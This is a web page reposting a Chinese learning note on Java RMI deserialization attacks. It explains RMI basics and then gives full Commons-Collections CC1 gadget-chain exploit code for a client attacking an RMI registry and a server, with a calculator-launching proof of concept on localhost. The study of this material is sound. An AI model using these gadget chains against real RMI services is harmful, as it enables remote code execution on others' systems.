@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html class="no-js" lang="zh-CN">
+
+<head>
+        <link rel="canonical" href="https://sockscap64.github.io/news/article-33097.htm" />
+    <title>RMI反序列化学习</title>
+        <meta name="description" content="RMI学习 1、RMI简介 RMI（Remote Method Invocation），远程方法调用方法，其实就是本地java虚拟机要调用其他java虚拟机的方法，两个虚拟机可以是运行在相同计算机上的" />
+        <link rel="icon" href="/assets/website/img/sockscap64/favicon.ico" type="image/x-icon"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="templatemo">
+    <meta charset="UTF-8">
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,600italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Droid+Serif:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <!-- CSS Bootstrap & Custom -->
+    <link href="/assets/website/js/frontend/sockscap64/bootstrap/css/bootstrap.css" rel="stylesheet" media="screen">
+    <link rel="stylesheet" href="/assets/website/css/sockscap64/font-awesome.min.css">
+    <link rel="stylesheet" href="/assets/website/css/sockscap64/templatemo-misc.css">
+    <link rel="stylesheet" href="/assets/website/css/sockscap64/animate.css">
+    <link rel="stylesheet" href="/assets/website/css/sockscap64/templatemo-main.css">
+    <!-- JavaScripts -->
+    <script src="/assets/website/js/frontend/sockscap64/jquery-1.10.2.min.js"></script>
+    <script src="/assets/website/js/frontend/sockscap64/modernizr.js"></script>
+    <!--[if lt IE 8]>
+<div style=' clear: both; text-align:center; position: relative;'>
+        <a href="http://www.microsoft.com/windows/internet-explorer/default.aspx?ocid=ie6_countdown_bannercode"><img src="http://storage.ie6countdown.com/assets/100/images/banners/warning_bar_0000_us.jpg" border="0" alt="" /></a>
+    </div>
+<![endif]-->
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FWWSJRFYQE"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FWWSJRFYQE');
+</script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
+     crossorigin="anonymous"></script>
+</head>
+
+<body data-page="detail">
+        <div id="home">
+        <div class="site-header">
+            <div class="main-header">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-4 col-sm-4 col-xs-6">
+                            <div class="logo">
+                                <a href="/">
+                                                                        <span>Sockscap64</span>
+                                                                </div> <!-- /.logo -->
+                        </div> <!-- /.col-md-4 -->
+                        <div class="col-md-8 col-sm-8 col-xs-6">
+                            <div class="menu text-right hidden-sm hidden-xs">
+                                <ul>
+                                                                        <li><a href="/">首页</a></li>
+                                                                        <li><a href="/free-nodes/">免费节点</a></li>
+                                                                        <li><a href="/paid-subscribe/">推荐机场</a></li>
+                                                                        <li><a href="/news/">新闻资讯</a></li>
+                                                                        <li><a href="#">关于</a></li>
+                                    <li><a href="#">联系</a></li>
+                                </ul>
+                            </div> <!-- /.menu -->
+                        </div> <!-- /.col-md-8 -->
+                    </div> <!-- /.row -->
+                    <div class="responsive-menu text-right visible-xs visible-sm">
+                        <a href="#" class="toggle-menu fa fa-bars"></a>
+                        <div class="menu">
+                            <ul>
+                                                                <li><a href="/">首页</a></li>
+                                                                <li><a href="/free-nodes/">免费节点</a></li>
+                                                                <li><a href="/paid-subscribe/">推荐机场</a></li>
+                                                                <li><a href="/news/">新闻资讯</a></li>
+                                                                <li><a href="#">关于</a></li>
+                                <li><a href="#">联系</a></li>
+                            </ul>
+                        </div> <!-- /.menu -->
+                    </div> <!-- /.responsive-menu -->
+                </div> <!-- /.container -->
+            </div> <!-- /.header -->
+        </div> <!-- /.site-header -->
+    </div> <!-- /#home -->
+    <div class="flexslider">
+        <ul class="slides">
+            <li>
+                <img src="/assets/website/img/sockscap64/banner01.jpg" alt="">
+                <div class="flex-caption">
+                    <h1>RMI反序列化学习</h1>
+                    <span></span>
+                    <p>
+                        <a href="/">首页</a> / <a href="/news/">新闻资讯</a> / 正文
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+    <div id="services" class="section-cotent">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-9">
+                                    <input type="hidden" id="share-website-info" data-name="Clash Node官网订阅站" data-url="https://clashnode.github.io">
+                  				  				  				<h2 id="rmi学习">RMI学习</h2> <h3 id="1rmi简介">1、RMI简介</h3> <p>RMI（Remote Method Invocation），远程方法调用方法，其实就是本地java虚拟机要调用其他java虚拟机的方法，两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</p> <p>如果复现过fastjson漏洞就知道我们的payload经常会携带rmi、jndi等协议。而且对于jdk的版本有要求</p> <pre><code class="language-java">基于RMI利用的JDK版本&lt;=6u141、7u131、8u121 基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191</code></pre> <p>RMI依赖的通信协议为<strong>JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)</strong>，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。</p> <h3 id="2rmi的组成部分">2、RMI的组成部分</h3> <pre><code class="language-java">Client-客户端:客户端调用服务端的方法  Server-服务端:远程调用方法对象的提供者  Registry-注册中心：RMI Server可以在上⾯注册⼀个Name到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server，最后也是代码真正执行的地方。</code></pre> <h3 id="3rmi的调用过程">3、RMI的调用过程</h3> <h5 id="31server部署">3.1、server部署</h5> <pre><code>Server向Registry注册远程对象，远程对象绑定在一个`//hostL:port/objectname`上，形成一个映射表（Service-Stub）</code></pre> <h5 id="32client调用">3.2、Client调用</h5> <pre><code>1. Client向Registry通过RMI地址查询对应的远程引用（Stub）。这个远程引用包含了一个服务器主机名和端口号。 2. Client拿着Registry给它的远程引用，照着上面的服务器主机名、端口去连接提供服务的远程RMI服务器 3. Client传送给Server需要调用函数的输入参数，Server执行远程方法，并返回给Client执行结果。</code></pre> <p>客户端会通过Stub序列化数据后传输给服务端，服务端会把客户端传输过来的内容反序列化执行。前提是传输的是可序列化对象(Object)</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/3b6d73972151909cf52cd72547cbc340.jpg" alt="RMI反序列化学习"></p> <p>图是用的https://paper.seebug.org/1251/#jdk</p> <h3 id="4rmi的基础运用">4、RMI的基础运用</h3> <p><strong>Server</strong></p> <p>1、首先要实现一个继承了Remote的接口，并且要抛出RemoteException异常，并且远程调用的方法的修饰符为public，此处的work方法主要用于反序列化利用</p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.Remote; import java.rmi.RemoteException;  public interface User extends Remote {      public String getName() throws RemoteException;  }</code></pre> <p>2、编写这个接口的实现类，还需要继承UnicastRemoteObject类，大部分方法都是因为继承了UnicastRemoteObject所以实现的</p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.RemoteException; import java.rmi.server.RMIClientSocketFactory; import java.rmi.server.RMIServerSocketFactory; import java.rmi.server.UnicastRemoteObject;  public class UserImpl extends UnicastRemoteObject implements User{      public String name;     protected UserImpl() throws RemoteException{         super();     }      @Override     public Object clone() throws CloneNotSupportedException {         return super.clone();     }      protected UserImpl(int port, RMIClientSocketFactory csf, RMIServerSocketFactory ssf) throws RemoteException {         super(port, csf, ssf);     }      protected UserImpl(int port) throws RemoteException {         super(port);     }      public UserImpl(String name) throws RemoteException {         this.name = name;     }       @Override     public String getName() throws RemoteException {         return name;     }        }</code></pre> <p>3、编写服务器类</p> <p>创建服务器实例，并且创建一个注册表，将需要提供给客户端的对象注册到注册到注册表中</p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry;  public class RMIServer {     public static void main(String[] args) throws RemoteException, AlreadyBoundException {         UserImpl user = new UserImpl("akka");         //创建注册中心，设置端口为1234         Registry registry = LocateRegistry.createRegistry(1234);         System.out.println("registry is runing.....");         //绑定user对象到名字叫user下         registry.bind("user", user);         System.out.println("user is bing");      } }</code></pre> <p>4、编写客户端类</p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.NotBoundException; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry;  public class RMIClient {     public static void main(String[] args) throws RemoteException, NotBoundException {         Registry registry = LocateRegistry.getRegistry("localhost", 1234);         User user = (User)registry.lookup("user");         System.out.println(user.getName());     } }</code></pre> <p>先开启服务端</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/428238d40060f93928dd6140f95cab38.jpg" alt="RMI反序列化学习"></p> <p>再开启客户端调用远程方法</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/96b9b9617c14a972745894bf03785ff0.jpg" alt="RMI反序列化学习"></p> <h3 id="5rmi的反序列利用">5、RMI的反序列利用</h3> <p>有几种攻击手段，这里只弄了两种客户端攻击的案列，具体可以学习https://paper.seebug.org/1251/#java-rmi-</p> <h4 id="51客户端攻击注册中心">5.1、客户端攻击注册中心。</h4> <p>需要指定注册的方法bind &amp; rebind</p> <p>需要使用到RM进行反序列化攻击需要两个条件：RMI的服务端存在执行命令利用链，这里用的是cc1。还有就是jdk版本我用的jdk8u66和commons-collections3.1成功弹窗</p> <p>服务端的代码不用改变</p> <p>客户端代码修改如下</p> <pre><code class="language-java">package com.akkacloud.rmi;  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap;  import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.rmi.NotBoundException; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.HashMap; import java.util.Map;  public class RMIClient {     public static void main(String[] args) throws Exception {         ChainedTransformer chain = new ChainedTransformer(new Transformer[] {                 new ConstantTransformer(Runtime.class),                 new InvokerTransformer("getMethod", new Class[] {                         String.class, Class[].class }, new Object[] {                         "getRuntime", new Class[0] }),                 new InvokerTransformer("invoke", new Class[] {                         Object.class, Object[].class }, new Object[] {                         null, new Object[0] }),                 new InvokerTransformer("exec",                         new Class[] { String.class }, new Object[]{"open /System/Applications/Calculator.app"})});         HashMap innermap = new HashMap();         Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");         Constructor[] constructors = clazz.getDeclaredConstructors();         Constructor constructor = constructors[0];         constructor.setAccessible(true);         Map map = (Map)constructor.newInstance(innermap,chain);           Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);         handler_constructor.setAccessible(true);         InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler          Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象           Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);         AnnotationInvocationHandler_Constructor.setAccessible(true);         InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);          Registry registry = LocateRegistry.getRegistry("127.0.0.1",1234);         Remote r = Remote.class.cast(Proxy.newProxyInstance(                 Remote.class.getClassLoader(),                 new Class[] { Remote.class }, handler));         registry.bind("test",r);     }      }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/d616a412c6fa73aae372c15019b946de.jpg" alt="RMI反序列化学习"></p> <p>handler是InvocationHandler对象，所以这里在反序列化时会调用InvocationHandler对象的invoke方法，具体就是cc1的相关内容不同的可以学习cc1</p> <h4 id="52客户端攻击服务端">5.2、客户端攻击服务端</h4> <p>如果服务端存在接受Object参数的方法时，当服务端接收数据时，就会调用readObject，当然也要存在利用链。</p> <p>首先我们在服务端添加上 接受Object方法的参数,当客户端调用这个方法时候，服务端会对其传递的参数进行反序列化</p> <p><strong>接口User添加接受Object类型的方法</strong></p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.Remote; import java.rmi.RemoteException;  public interface User extends Remote {      public String getName() throws RemoteException;     public void addUser(Object user)throws RemoteException; }</code></pre> <p><strong>实现类UserImpl添加方法</strong></p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.RemoteException; import java.rmi.server.RMIClientSocketFactory; import java.rmi.server.RMIServerSocketFactory; import java.rmi.server.UnicastRemoteObject;  public class UserImpl extends UnicastRemoteObject implements User{      public String name;     protected UserImpl() throws RemoteException{         super();     }      @Override     public Object clone() throws CloneNotSupportedException {         return super.clone();     }      protected UserImpl(int port, RMIClientSocketFactory csf, RMIServerSocketFactory ssf) throws RemoteException {         super(port, csf, ssf);     }      protected UserImpl(int port) throws RemoteException {         super(port);     }      public UserImpl(String name) throws RemoteException {         this.name = name;     }       @Override     public String getName() throws RemoteException {         return name;     }      @Override     public void addUser(Object user) throws RemoteException{         System.out.println("addsuer:"+this.name);     }   }</code></pre> <p><strong>服务端一样</strong></p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry;  public class RMIServer {     public static void main(String[] args) throws RemoteException, AlreadyBoundException {         UserImpl user = new UserImpl("akka");         //创建注册中心，设置端口为1234         Registry registry = LocateRegistry.createRegistry(1234);         System.out.println("registry is runing.....");         //绑定user对象到名字叫user下         registry.bind("user", user);         System.out.println("user is bing");       } }</code></pre> <p><strong>客户端代码</strong></p> <pre><code class="language-java">package com.akkacloud.rmi;  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap;  import java.lang.annotation.Retention; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.rmi.NotBoundException; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.HashMap; import java.util.Map;  public class RMIClient {     public static void main(String[] args) throws Exception {         ChainedTransformer chain = new ChainedTransformer(new Transformer[] {                 new ConstantTransformer(Runtime.class),                 new InvokerTransformer("getMethod", new Class[] {                         String.class, Class[].class }, new Object[] {                         "getRuntime", new Class[0] }),                 new InvokerTransformer("invoke", new Class[] {                         Object.class, Object[].class }, new Object[] {                         null, new Object[0] }),                 new InvokerTransformer("exec",                         new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});         HashMap innermap = new HashMap();         Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");         Constructor[] constructors = clazz.getDeclaredConstructors();         Constructor constructor = constructors[0];         constructor.setAccessible(true);         Map map = (Map)constructor.newInstance(innermap,chain);           Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);         handler_constructor.setAccessible(true);         InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler          Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象           Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);         AnnotationInvocationHandler_Constructor.setAccessible(true);         InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);          Registry registry = LocateRegistry.getRegistry("127.0.0.1",1234);         User user = (User) registry.lookup("user");         user.addUser(handler);     }   }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/270d6066adafd2e577c118e358ce8826.jpg" alt="RMI反序列化学习"></p> <p>参考链接</p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://paper.seebug.org/1251/#registry"  target="_blank" rel="nofollow">https://paper.seebug.org/1251/#registry</a></p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://xz.aliyun.com/t/6660#toc-2"  target="_blank" rel="nofollow">https://xz.aliyun.com/t/6660#toc-2</a></p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://www.cnblogs.com/nice0e3/p/13927460.html"  target="_blank" rel="nofollow">https://www.cnblogs.com/nice0e3/p/13927460.html</a></p> 			                <div class="clearfix"></div>
+                <div class="col-md-12 mt-5">
+                                        <p>上一个：<a href="/news/article-33096.htm">centos7-linux安装docker(离线方式)</a></p>
+                                        <p>下一个：<a href="/news/article-33574.htm">Vue中引入静态资源的几种方式</a></p>
+                                    </div>
+                                </div>
+                <div class="col-md-3">
+                    <div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">热门文章</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2"><a href="/news/article-32149.htm" title="猫三联多少钱一针为什么有上千（猫三联一共几针多少钱）">猫三联多少钱一针为什么有上千（猫三联一共几针多少钱）</a></li>
+                        <li class="py-2"><a href="/news/article-33097.htm" title="RMI反序列化学习">RMI反序列化学习</a></li>
+                        <li class="py-2"><a href="/news/article-31163.htm" title="宠物粮怎么卖赚钱（做宠物粮生意赚钱吗）">宠物粮怎么卖赚钱（做宠物粮生意赚钱吗）</a></li>
+                        <li class="py-2"><a href="/news/article-30245.htm" title="宠物粮食品牌前十排名榜单 宠物粮食品牌前十排名榜单图片">宠物粮食品牌前十排名榜单 宠物粮食品牌前十排名榜单图片</a></li>
+                        <li class="py-2"><a href="/news/article-32625.htm" title="北京爱宠怡康动物医院(梧桐店)（北京宠爱动物医院消费高吗）">北京爱宠怡康动物医院(梧桐店)（北京宠爱动物医院消费高吗）</a></li>
+                        <li class="py-2"><a href="/news/article-32150.htm" title="八公家宠物酒店（八公家宠物酒店怎么样）">八公家宠物酒店（八公家宠物酒店怎么样）</a></li>
+                        <li class="py-2"><a href="/news/article-31679.htm" title="记-Windows环境下Prometheus+alertmanager+windows_exporter+mtail监控部署提起网关日志">记-Windows环境下Prometheus+alertmanager+windows_exporter+mtail监控部署提起网关日志</a></li>
+                        <li class="py-2"><a href="/news/article-30724.htm" title="动物防疫疫苗管理要点包括什么和什么（动物防疫疫苗管理要点包括什么和什么两个方面）">动物防疫疫苗管理要点包括什么和什么（动物防疫疫苗管理要点包括什么和什么两个方面）</a></li>
+                        <li class="py-2"><a href="/news/article-30137.htm" title="学兽医去哪里学比较好就业（学兽医去哪里学比较好就业方向）">学兽医去哪里学比较好就业（学兽医去哪里学比较好就业方向）</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-12-31-free-node-subscribe-links.htm" title="12月31日→20.2M/S|2025年最新免费节点Sockscap64订阅链接地址">12月31日→20.2M/S|2025年最新免费节点Sockscap64订阅链接地址</a></li>
+                    </ul>
+    </div>
+</div>
+
+<div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">归纳</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">27</span> <a href="/date/2024-12/" title="2024-12 归档">2024-12</a></h4>
+            </li>
+                    </ul>
+    </div>
+</div>
+
+                </div>
+            </div> <!-- /.row -->
+        </div> <!-- /.container -->
+    </div> <!-- /#services -->
+        <div class="site-footer">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 col-sm-8 col-xs-12">
+                    <p>
+                        <a href="/">首页</a> |
+                        <a href="/free-node/">免费节点</a> |
+                        <a href="/news/">新闻资讯</a> |
+                        <a href="/about-us.htm">关于我们</a> |
+                        <a href="/disclaimer.htm">免责申明</a> |
+                        <a href="/privacy.htm">隐私申明</a> |
+                        <a href="/sitemap.xml">网站地图</a>
+                    </p>
+                    <p>Sockscap64免费机场节点分享官网 版权所有 Powered by WordPress</p>
+                </div> <!-- /.col-md-6 -->
+                <div class="col-md-4 col-sm-4 col-xs-12">
+                    <div class="go-top">
+                        <a href="#" id="go-top">
+                            <i class="fa fa-angle-up"></i>
+                            Back to Top
+                        </a>
+                    </div>
+                </div> <!-- /.col-md-6 -->
+            </div> <!-- /.row -->
+        </div> <!-- /.container -->
+    </div> <!-- /.site-footer -->
+    <script src="/assets/website/js/frontend/sockscap64/bootstrap/js/bootstrap.min.js"></script>
+    <script src="/assets/website/js/frontend/sockscap64/plugins.js"></script>
+    <script src="/assets/website/js/frontend/sockscap64/jquery.lightbox.js"></script>
+    <script src="/assets/website/js/frontend/sockscap64/custom.js"></script>
+    <script src="https://www.freeclashnode.com/assets/js/frontend/invite-url.js"></script>
+    <script src="/assets/website/js/frontend/G.js"></script>
+</body>
+
+</html>
